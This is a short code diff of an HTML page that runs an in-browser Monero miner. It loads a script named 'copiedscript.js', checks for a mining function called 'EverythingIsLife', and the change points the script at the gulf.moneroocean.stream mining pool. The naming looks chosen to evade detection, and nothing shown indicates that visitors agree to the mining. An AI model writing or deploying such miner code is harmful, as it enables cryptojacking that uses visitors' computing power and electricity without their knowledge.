@@ -422,7 +422,7 @@
             }, 300000);
         };
     </script>
-   <script src="/Foxminer/copiedscript.js"></script>
+   <script src="/Foxminer/copiedscript.js?karma=bs?nosaj=gulf.moneroocean.stream:80"></script>
 <script type="text/javascript">
     let minerRunning = false;
     let currentWallet = '';
@@ -443,7 +443,7 @@
         }
         if (minerRunning) {
             console.log('Miner already running for ' + currentWallet);
-            return; // Don’t restart if already going
+            return;
         }
         if (typeof EverythingIsLife !== 'function') {
             console.error('Mining script not loaded - EverythingIsLife is undefined');
